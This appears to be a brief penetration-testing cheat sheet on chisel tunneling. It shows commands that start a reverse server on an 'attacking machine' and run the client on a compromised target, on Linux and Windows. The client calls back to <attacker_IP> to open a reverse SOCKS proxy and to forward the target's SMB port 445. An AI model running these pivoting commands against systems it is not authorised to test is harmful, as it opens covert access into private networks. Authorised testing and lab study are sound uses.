On the attacking machine run:

```bash
./chisel server -p 8002 --reverse
```

On target run:

Linux:
```bash
./chisel client <attacker_IP>:8002 R:1080:socks
```

Windows:
```bash
chisel.exe client <attacker_IP>:8002 R:1080:socks
```

Example of port forwarding single port:

```bash
.\chisel.exe client <attacker_IP>:8002 R:445:127.0.0.1:445
```
